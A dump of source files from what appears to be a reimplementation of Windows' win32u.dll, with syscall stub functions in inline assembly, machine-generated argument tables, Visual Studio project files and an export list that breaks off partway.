__declspec(naked) ULONG NTAPI NtGdiOffsetViewportOrgEx()
{
    __asm {
        mov eax, 000012A1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiOffsetWindowOrgEx()
{
    __asm {
        mov eax, 000012A2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetMonitorInfo()
{
    __asm {
        mov eax, 000012A3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserMonitorFromPoint()
{
    __asm {
        mov eax, 000012A4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserMonitorFromRect()
{
    __asm {
        mov eax, 000012A5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserMonitorFromWindow()
{
    __asm {
        mov eax, 000012A6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetScrollBarInfo()
{
    __asm {
        mov eax, 000012A7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdDDICreateDCFromMemory()
{
    __asm {
        mov eax, 000012A8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdDDIDestroyDCFromMemory()
{
    __asm {
        mov eax, 000012A9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}


```

`source/ROS/win32u/win32u/w32parguments.h`:

```h
/* MACHINE GENERATED, DO NOT EDIT */
UCHAR W32pServiceArgumentTable[] = {
1, 1, 6, 4, 5, 2, 3, 12, 6, 0, 1, 10, 1, 11, 1, 8, 1, 2, 2, 6, 4, 3, 1, 4, 2, 5, 1, 1, 8, 3, 1, 6, 11, 9, 4, 1, 3, 1, 2, 3, 4, 4, 6, 6, 2, 4, 1, 1, 1, 7, 1, 
3, 3, 2, 2, 3, 2, 2, 2, 1, 8, 8, 2, 6, 1, 1, 2, 2, 1, 2, 5, 2, 2, 2, 2, 2, 3, 2, 2, 2, 2, 2, 2, 3, 2, 11, 2, 2, 1, 2, 2, 2, 2, 3, 3, 3, 2, 2, 2, 3, 2, 
2, 2, 2, 2, 4, 2, 2, 2, 2, 2, 2, 2, 2, 4, 2, 3, 2, 6, 1, 1, 2, 1, 4, 2, 4, 6, 4, 5, 1, 1, 1, 1, 5, 1, 7, 4, 2, 7, 5, 11, 3, 8, 5, 3, 3, 9, 1, 3, 1, 0, 
2, 5, 5, 4, 2, 3, 2, 3, 6, 6, 1, 6, 2, 2, 1, 3, 1, 2, 3, 2, 2, 2, 9, 2, 3, 5, 7, 5, 6, 8, 3, 3, 2, 3, 2, 2, 2, 4, 4, 3, 3, 2, 3, 3, 2, 7, 4, 5, 1, 5, 
1, 3, 5, 8, 4, 3, 3, 6, 7, 10, 0, 2, 2, 2, 7, 6, 5, 8, 0, 0, 5, 2, 3, 5, 2, 13, 3, 1, 4, 3, 3, 7, 6, 5, 1, 11, 4, 5, 4, 3, 3, 3, 1, 5, 2, 2, 6, 1, 5, 2, 
2, 7, 1, 6, 6, 2, 2, 2, 2, 2, 2, 3, 4, 3, 2, 4, 2, 2, 2, 16, 1, 3, 3, 3, 3, 1, 3, 1, 1, 3, 4, 2, 5, 2, 3, 3, 5, 3, 4, 1, 12, 16, 1, 1, 1, 5, 11, 2, 1, 1, 
1, 1, 2, 3, 3, 3, 2, 8, 1, 4, 7, 4, 4, 2, 2, 2, 3, 3, 2, 4, 1, 2, 3, 2, 4, 2, 3, 4, 1, 0, 1, 1, 3, 2, 3, 0, 2, 4, 5, 1, 4, 15, 7, 3, 5, 3, 8, 2, 3, 1, 
2, 1, 1, 1, 1, 1, 3, 5, 4, 4, 7, 11, 5, 0, 3, 3, 2, 0, 2, 4, 5, 4, 1, 2, 4, 3, 5, 1, 6, 2, 1, 1, 2, 0, 1, 5, 3, 2, 3, 0, 0, 0, 1, 2, 3, 4, 3, 4, 1, 1, 
3, 0, 0, 2, 2, 6, 4, 4, 2, 3, 2, 1, 1, 3, 1, 1, 4, 2, 4, 4, 5, 5, 0, 2, 0, 3, 5, 4, 3, 3, 3, 2, 2, 1, 2, 3, 3, 1, 2, 2, 3, 1, 4, 2, 3, 4, 12, 3, 3, 3, 
1, 2, 7, 1, 1, 0, 4, 4, 7, 3, 0, 2, 2, 6, 3, 4, 4, 2, 3, 3, 2, 1, 5, 4, 4, 3, 3, 4, 2, 1, 2, 3, 6, 2, 4, 7, 4, 4, 3, 1, 1, 3, 2, 4, 1, 4, 7, 8, 3, 3, 
1, 2, 1, 4, 3, 3, 1, 2, 1, 2, 4, 1, 5, 1, 2, 4, 4, 4, 1, 1, 3, 2, 3, 1, 4, 2, 1, 3, 4, 2, 4, 2, 2, 4, 1, 2, 2, 4, 2, 4, 2, 7, 3, 3, 6, 4, 3, 8, 1, 3, 
2, 2, 0, 1, 4, 1, 2, 6, 7, 1, 6, 5, 6, 3, 2, 1, 1, 1, 1, 3, 0, 2, 3, 3, 10, 4, 4, 2, 3, 1, 2, 1, 3, 3, 1, 0, 6, 2, 0, 3, 4, 0, 0, 3, 3, 6, 4, 4, 6, 3, 
6, 1, 1, 3, 1, 1, 11, 11, 11, 1, 8, 7, 10, 5, 9, 7, 10, 8, 10, 13, 4, 2, 1, 3, 5, 1, 1, 0, 1, 1, 2, 1, 1, 5, 2, 3, 1, 5, 1, 1, 2, 2, 2, 3, 3, 4, 1, 1, 2, 2, 
1, 4, 3, 1, 1, 4, 6, 1, 4, 2, 1, 3, 2, 1, 4, 4, 4, 4, 4, 2, 3, 2, 2, 3, 1, 1 };

```

`source/ROS/win32u/win32u/w32parguments_checked.h`:

```h
/* MACHINE GENERATED, DO NOT EDIT */
UCHAR W32pServiceArgumentTable[] = {
1, 1, 6, 4, 5, 2, 3, 12, 6, 0, 1, 10, 1, 11, 1, 8, 1, 2, 2, 6, 4, 3, 1, 4, 2, 5, 1, 1, 8, 3, 1, 6, 11, 9, 4, 1, 3, 1, 2, 3, 4, 4, 6, 6, 2, 4, 1, 1, 1, 7, 1, 
3, 3, 2, 2, 3, 2, 2, 2, 1, 8, 8, 2, 6, 1, 1, 2, 2, 1, 2, 5, 2, 2, 2, 2, 2, 3, 2, 2, 2, 2, 2, 2, 3, 2, 11, 2, 2, 1, 2, 2, 2, 2, 3, 3, 3, 2, 2, 2, 3, 2, 
2, 2, 2, 2, 4, 2, 2, 2, 2, 2, 2, 2, 2, 4, 2, 3, 2, 6, 1, 1, 2, 1, 4, 2, 4, 6, 4, 5, 1, 1, 1, 1, 5, 1, 7, 4, 2, 7, 5, 11, 3, 8, 5, 3, 3, 9, 1, 3, 1, 0, 
2, 5, 5, 4, 2, 3, 2, 3, 6, 6, 1, 6, 2, 2, 1, 3, 1, 2, 3, 2, 2, 2, 9, 2, 3, 5, 7, 5, 6, 8, 3, 3, 2, 3, 2, 2, 2, 4, 4, 3, 3, 2, 3, 3, 2, 7, 4, 5, 1, 5, 
1, 3, 5, 8, 4, 3, 3, 6, 7, 10, 0, 2, 2, 2, 7, 6, 5, 8, 0, 0, 5, 2, 3, 5, 2, 13, 3, 1, 4, 3, 3, 7, 6, 5, 1, 11, 4, 5, 4, 3, 3, 3, 1, 5, 2, 2, 6, 1, 5, 2, 
2, 7, 1, 6, 6, 2, 2, 2, 2, 2, 2, 3, 4, 3, 2, 4, 2, 2, 2, 16, 1, 3, 3, 3, 3, 1, 3, 1, 1, 3, 4, 2, 5, 2, 3, 3, 5, 3, 4, 1, 12, 16, 1, 1, 1, 5, 11, 2, 1, 1, 
1, 1, 2, 3, 3, 3, 2, 8, 1, 4, 7, 4, 4, 2, 2, 2, 3, 3, 2, 4, 1, 2, 3, 2, 4, 2, 3, 4, 1, 0, 1, 1, 3, 2, 3, 0, 2, 4, 5, 1, 4, 15, 7, 3, 5, 3, 8, 2, 3, 1, 
2, 1, 1, 1, 1, 1, 3, 5, 4, 4, 7, 11, 5, 0, 3, 3, 2, 0, 2, 4, 5, 4, 1, 2, 4, 3, 5, 1, 6, 2, 1, 1, 2, 0, 1, 5, 3, 2, 3, 0, 0, 0, 1, 2, 3, 4, 3, 4, 1, 1, 
3, 0, 0, 2, 2, 6, 4, 4, 2, 3, 2, 1, 1, 3, 1, 1, 4, 2, 4, 4, 5, 5, 0, 2, 0, 3, 5, 4, 3, 3, 3, 2, 2, 1, 2, 3, 3, 1, 2, 2, 3, 1, 4, 2, 3, 4, 12, 3, 3, 3, 
1, 2, 7, 1, 1, 0, 4, 4, 7, 3, 0, 2, 2, 6, 3, 4, 4, 2, 3, 3, 2, 1, 5, 4, 4, 3, 3, 4, 2, 1, 2, 3, 6, 2, 4, 7, 4, 4, 3, 1, 1, 3, 2, 4, 1, 4, 7, 8, 3, 3, 
1, 2, 1, 4, 3, 3, 1, 2, 1, 2, 4, 1, 5, 1, 2, 4, 4, 4, 1, 1, 3, 2, 3, 1, 4, 2, 1, 3, 4, 2, 4, 2, 2, 4, 1, 2, 2, 4, 2, 4, 2, 7, 3, 3, 6, 4, 3, 8, 1, 3, 
2, 2, 0, 1, 4, 1, 2, 6, 7, 1, 6, 5, 6, 3, 2, 1, 1, 1, 1, 3, 0, 2, 3, 3, 10, 4, 4, 2, 3, 1, 2, 1, 3, 3, 1, 0, 6, 2, 0, 3, 4, 0, 0, 3, 3, 6, 4, 4, 6, 3, 
6, 1, 1, 3, 1, 1, 11, 11, 11, 1, 8, 7, 10, 5, 9, 7, 10, 8, 10, 13, 4, 2, 1, 3, 5, 1, 1, 0, 1, 1, 2, 1, 1, 5, 2, 3, 1, 5, 1, 1, 2, 2, 2, 3, 3, 4, 1, 1, 2, 2, 
1, 4, 3, 1, 1, 4, 6, 1, 4, 2, 1, 3, 2, 2, 2, 1, 1, 2, 1, 4, 4, 4, 4, 4, 2, 3, 2, 2, 3, 1, 1 };

```

`source/ROS/win32u/win32u/win32u.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="ReleaseForChecked|Win32">
      <Configuration>ReleaseForChecked</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{8AF1DA16-D7F8-4814-BF5D-526456A574B2}</ProjectGuid>
    <RootNamespace>win32u</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseForChecked|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings" />
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseForChecked|Win32'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <OutDir>.\output\$(Platform)\$(Configuration)\bin\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <GenerateManifest>false</GenerateManifest>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <OutDir>.\output\$(Platform)\$(Configuration)\bin\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <GenerateManifest>false</GenerateManifest>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseForChecked|Win32'">
    <OutDir>.\output\$(Platform)\$(Configuration)\bin\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <GenerateManifest>false</GenerateManifest>
    <TargetName>$(ProjectName)_checked</TargetName>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <Optimization>Disabled</Optimization>
      <ConformanceMode>true</ConformanceMode>
      <BufferSecurityCheck>false</BufferSecurityCheck>
    </ClCompile>
    <Link>
      <ModuleDefinitionFile>win32u_export.def</ModuleDefinitionFile>
      <EntryPointSymbol>DllMain</EntryPointSymbol>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <Optimization>MinSpace</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>
      </SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <ControlFlowGuard>false</ControlFlowGuard>
      <WholeProgramOptimization>false</WholeProgramOptimization>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <ModuleDefinitionFile>win32u_export.def</ModuleDefinitionFile>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <SetChecksum>true</SetChecksum>
      <EntryPointSymbol>
      </EntryPointSymbol>
      <NoEntryPoint>true</NoEntryPoint>
      <LinkTimeCodeGeneration />
      <AdditionalOptions>/NOCOFFGRPINFO %(AdditionalOptions)</AdditionalOptions>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseForChecked|Win32'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <Optimization>MinSpace</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>
      </SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <ControlFlowGuard>false</ControlFlowGuard>
      <WholeProgramOptimization>false</WholeProgramOptimization>
      <PreprocessorDefinitions>_RELEASE_FOR_CHECKED;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <ModuleDefinitionFile>win32u_export_checked.def</ModuleDefinitionFile>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <SetChecksum>true</SetChecksum>
      <EntryPointSymbol>
      </EntryPointSymbol>
      <NoEntryPoint>true</NoEntryPoint>
      <LinkTimeCodeGeneration>
      </LinkTimeCodeGeneration>
      <AdditionalOptions>/NOCOFFGRPINFO %(AdditionalOptions)</AdditionalOptions>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="main.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="resource.h" />
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="ver.rc" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets" />
</Project>
```

`source/ROS/win32u/win32u/win32u.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="resource.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="ver.rc">
      <Filter>Resource Files</Filter>
    </ResourceCompile>
  </ItemGroup>
</Project>
```

`source/ROS/win32u/win32u/win32u.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`source/ROS/win32u/win32u/win32u_export.def`:

```def
; MACHINE GENERATED, DO NOT EDIT
EXPORTS
W32pServiceLimit
W32pServiceArgumentTable
NtGdiAbortDoc
NtGdiAbortPath
NtGdiAddFontResourceW
NtGdiAddRemoteFontToDC
NtGdiAddFontMemResourceEx
NtGdiRemoveMergeFont
NtGdiAddRemoteMMInstanceToDC
NtGdiAlphaBlend
NtGdiAngleArc
NtGdiAnyLinkedFonts
NtGdiFontIsLinked
NtGdiArcInternal
NtGdiBeginPath
NtGdiBitBlt
NtGdiCancelDC
NtGdiCheckBitmapBits
NtGdiCloseFigure
NtGdiClearBitmapAttributes
NtGdiClearBrushAttributes
NtGdiColorCorrectPalette
NtGdiCombineRgn
NtGdiCombineTransform
NtGdiComputeXformCoefficients
NtGdiConsoleTextOut
NtGdiConvertMetafileRect
NtGdiCreateBitmap
NtGdiCreateClientObj
NtGdiCreateColorSpace
NtGdiCreateColorTransform
NtGdiCreateCompatibleBitmap
NtGdiCreateCompatibleDC
NtGdiCreateDIBBrush
NtGdiCreateDIBitmapInternal
NtGdiCreateDIBSection
NtGdiCreateEllipticRgn
NtGdiCreateHalftonePalette
NtGdiCreateHatchBrushInternal
NtGdiCreateMetafileDC
NtGdiCreatePaletteInternal
NtGdiCreatePatternBrushInternal
NtGdiCreatePen
NtGdiCreateRectRgn
NtGdiCreateRoundRectRgn
NtGdiCreateServerMetaFile
NtGdiCreateSolidBrush
NtGdiD3dContextCreate
NtGdiD3dContextDestroy
NtGdiD3dContextDestroyAll
NtGdiD3dValidateTextureStageState
NtGdiD3dDrawPrimitives2
NtGdiDdGetDriverState
NtGdiDdAddAttachedSurface
NtGdiDdAlphaBlt
NtGdiDdAttachSurface
NtGdiDdBeginMoCompFrame
NtGdiDdBlt
NtGdiDdCanCreateSurface
NtGdiDdCanCreateD3DBuffer
NtGdiDdColorControl
NtGdiDdCreateDirectDrawObject
NtGdiDdCreateSurface
NtGdiDdCreateD3DBuffer
NtGdiDdCreateMoComp
NtGdiDdCreateSurfaceObject
NtGdiDdDeleteDirectDrawObject
NtGdiDdDeleteSurfaceObject
NtGdiDdDestroyMoComp
NtGdiDdDestroySurface
NtGdiDdDestroyD3DBuffer
NtGdiDdEndMoCompFrame
NtGdiDdFlip
NtGdiDdFlipToGDISurface
NtGdiDdGetAvailDriverMemory
NtGdiDdGetBltStatus
NtGdiDdGetDC
NtGdiDdGetDriverInfo
NtGdiDdGetDxHandle
NtGdiDdGetFlipStatus
NtGdiDdGetInternalMoCompInfo
NtGdiDdGetMoCompBuffInfo
NtGdiDdGetMoCompGuids
NtGdiDdGetMoCompFormats
NtGdiDdGetScanLine
NtGdiDdLock
NtGdiDdLockD3D
NtGdiDdQueryDirectDrawObject
NtGdiDdQueryMoCompStatus
NtGdiDdReenableDirectDrawObject
NtGdiDdReleaseDC
NtGdiDdRenderMoComp
NtGdiDdResetVisrgn
NtGdiDdSetColorKey
NtGdiDdSetExclusiveMode
NtGdiDdSetGammaRamp
NtGdiDdCreateSurfaceEx
NtGdiDdSetOverlayPosition
NtGdiDdUnattachSurface
NtGdiDdUnlock
NtGdiDdUnlockD3D
NtGdiDdUpdateOverlay
NtGdiDdWaitForVerticalBlank
NtGdiDvpCanCreateVideoPort
NtGdiDvpColorControl
NtGdiDvpCreateVideoPort
NtGdiDvpDestroyVideoPort
NtGdiDvpFlipVideoPort
NtGdiDvpGetVideoPortBandwidth
NtGdiDvpGetVideoPortField
NtGdiDvpGetVideoPortFlipStatus
NtGdiDvpGetVideoPortInputFormats
NtGdiDvpGetVideoPortLine
NtGdiDvpGetVideoPortOutputFormats
NtGdiDvpGetVideoPortConnectInfo
NtGdiDvpGetVideoSignalStatus
NtGdiDvpUpdateVideoPort
NtGdiDvpWaitForVideoPortSync
NtGdiDvpAcquireNotification
NtGdiDvpReleaseNotification
NtGdiDxgGenericThunk
NtGdiDeleteClientObj
NtGdiDeleteColorSpace
NtGdiDeleteColorTransform
NtGdiDeleteObjectApp
NtGdiDescribePixelFormat
NtGdiGetPerBandInfo
NtGdiDoBanding
NtGdiDoPalette
NtGdiDrawEscape
NtGdiEllipse
NtGdiEnableEudc
NtGdiEndDoc
NtGdiEndPage
NtGdiEndPath
NtGdiEnumFontChunk
NtGdiEnumFontClose
NtGdiEnumFontOpen
NtGdiEnumObjects
NtGdiEqualRgn
NtGdiEudcLoadUnloadLink
NtGdiExcludeClipRect
NtGdiExtCreatePen
NtGdiExtCreateRegion
NtGdiExtEscape
NtGdiExtFloodFill
NtGdiExtGetObjectW
NtGdiExtSelectClipRgn
NtGdiExtTextOutW
NtGdiFillPath
NtGdiFillRgn
NtGdiFlattenPath
NtGdiFlush
NtGdiForceUFIMapping
NtGdiFrameRgn
NtGdiFullscreenControl
NtGdiGetAndSetDCDword
NtGdiGetAppClipBox
NtGdiGetBitmapBits
NtGdiGetBitmapDimension
NtGdiGetBoundsRect
NtGdiGetCharABCWidthsW
NtGdiGetCharacterPlacementW
NtGdiGetCharSet
NtGdiGetCharWidthW
NtGdiGetCharWidthInfo
NtGdiGetColorAdjustment
NtGdiGetColorSpaceforBitmap
NtGdiGetDCDword
NtGdiGetDCforBitmap
NtGdiGetDCObject
NtGdiGetDCPoint
NtGdiGetDeviceCaps
NtGdiGetDeviceGammaRamp
NtGdiGetDeviceCapsAll
NtGdiGetDIBitsInternal
NtGdiGetETM
NtGdiGetEudcTimeStampEx
NtGdiGetFontData
NtGdiGetFontResourceInfoInternalW
NtGdiGetGlyphIndicesW
NtGdiGetGlyphIndicesWInternal
NtGdiGetGlyphOutline
NtGdiGetKerningPairs
NtGdiGetLinkedUFIs
NtGdiGetMiterLimit
NtGdiGetMonitorID
NtGdiGetNearestColor
NtGdiGetNearestPaletteIndex
NtGdiGetObjectBitmapHandle
NtGdiGetOutlineTextMetricsInternalW
NtGdiGetPath
NtGdiGetPixel
NtGdiGetRandomRgn
NtGdiGetRasterizerCaps
NtGdiGetRealizationInfo
NtGdiGetRegionData
NtGdiGetRgnBox
NtGdiGetServerMetaFileBits
NtGdiGetSpoolMessage
NtGdiGetStats
NtGdiGetStockObject
NtGdiGetStringBitmapW
NtGdiGetSystemPaletteUse
NtGdiGetTextCharsetInfo
NtGdiGetTextExtent
NtGdiGetTextExtentExW
NtGdiGetTextFaceW
NtGdiGetTextMetricsW
NtGdiGetTransform
NtGdiGetUFI
NtGdiGetEmbUFI
NtGdiGetUFIPathname
NtGdiGetEmbedFonts
NtGdiChangeGhostFont
NtGdiAddEmbFontToDC
NtGdiGetFontUnicodeRanges
NtGdiGetWidthTable
NtGdiGradientFill
NtGdiHfontCreate
NtGdiIcmBrushInfo
NtGdiInit
NtGdiInitSpool
NtGdiIntersectClipRect
NtGdiInvertRgn
NtGdiLineTo
NtGdiMakeFontDir
NtGdiMakeInfoDC
NtGdiMaskBlt
NtGdiModifyWorldTransform
NtGdiMonoBitmap
NtGdiMoveTo
NtGdiOffsetClipRgn
NtGdiOffsetRgn
NtGdiOpenDCW
NtGdiPatBlt
NtGdiPolyPatBlt
NtGdiPathToRegion
NtGdiPlgBlt
NtGdiPolyDraw
NtGdiPolyPolyDraw
NtGdiPolyTextOutW
NtGdiPtInRegion
NtGdiPtVisible
NtGdiQueryFonts
NtGdiQueryFontAssocInfo
NtGdiRectangle
NtGdiRectInRegion
NtGdiRectVisible
NtGdiRemoveFontResourceW
NtGdiRemoveFontMemResourceEx
NtGdiResetDC
NtGdiResizePalette
NtGdiRestoreDC
NtGdiRoundRect
NtGdiSaveDC
NtGdiScaleViewportExtEx
NtGdiScaleWindowExtEx
NtGdiSelectBitmap
NtGdiSelectBrush
NtGdiSelectClipPath
NtGdiSelectFont
NtGdiSelectPen
NtGdiSetBitmapAttributes
NtGdiSetBitmapBits
NtGdiSetBitmapDimension
NtGdiSetBoundsRect
NtGdiSetBrushAttributes
NtGdiSetBrushOrg
NtGdiSetColorAdjustment
NtGdiSetColorSpace
NtGdiSetDeviceGammaRamp
NtGdiSetDIBitsToDeviceInternal
NtGdiSetFontEnumeration
NtGdiSetFontXform
NtGdiSetIcmMode
NtGdiSetLinkedUFIs
NtGdiSetMagicColors
NtGdiSetMetaRgn
NtGdiSetMiterLimit
NtGdiGetDeviceWidth
NtGdiMirrorWindowOrg
NtGdiSetLayout
NtGdiSetPixel
NtGdiSetPixelFormat
NtGdiSetRectRgn
NtGdiSetSystemPaletteUse
NtGdiSetTextJustification
NtGdiSetupPublicCFONT
NtGdiSetVirtualResolution
NtGdiSetSizeDevice
NtGdiStartDoc
NtGdiStartPage
NtGdiStretchBlt
NtGdiStretchDIBitsInternal
NtGdiStrokeAndFillPath
NtGdiStrokePath
NtGdiSwapBuffers
NtGdiTransformPoints
NtGdiTransparentBlt
NtGdiUnloadPrinterDriver
NtGdiUnmapMemFont
NtGdiUnrealizeObject
NtGdiUpdateColors
NtGdiWidenPath
NtUserActivateKeyboardLayout
NtUserAlterWindowStyle
NtUserAssociateInputContext
NtUserAttachThreadInput
NtUserBeginPaint
NtUserBitBltSysBmp
NtUserBlockInput
NtUserBuildHimcList
NtUserBuildHwndList
NtUserBuildNameList
NtUserBuildPropList
NtUserCallHwnd
NtUserCallHwndLock
NtUserCallHwndOpt
NtUserCallHwndParam
NtUserCallHwndParamLock
NtUserCallMsgFilter
NtUserCallNextHookEx
NtUserCallNoParam
NtUserCallOneParam
NtUserCallTwoParam
NtUserChangeClipboardChain
NtUserChangeDisplaySettings
NtUserCheckImeHotKey
NtUserCheckMenuItem
NtUserChildWindowFromPointEx
NtUserClipCursor
NtUserCloseClipboard
NtUserCloseDesktop
NtUserCloseWindowStation
NtUserConsoleControl
NtUserConvertMemHandle
NtUserCopyAcceleratorTable
NtUserCountClipboardFormats
NtUserCreateAcceleratorTable
NtUserCreateCaret
NtUserCreateDesktop
NtUserCreateInputContext
NtUserCreateLocalMemHandle
NtUserCreateWindowEx
NtUserCreateWindowStation
NtUserDdeGetQualityOfService
NtUserDdeInitialize
NtUserDdeSetQualityOfService
NtUserDeferWindowPos
NtUserDefSetText
NtUserDeleteMenu
NtUserDestroyAcceleratorTable
NtUserDestroyCursor
NtUserDestroyInputContext
NtUserDestroyMenu
NtUserDestroyWindow
NtUserDisableThreadIme
NtUserDispatchMessage
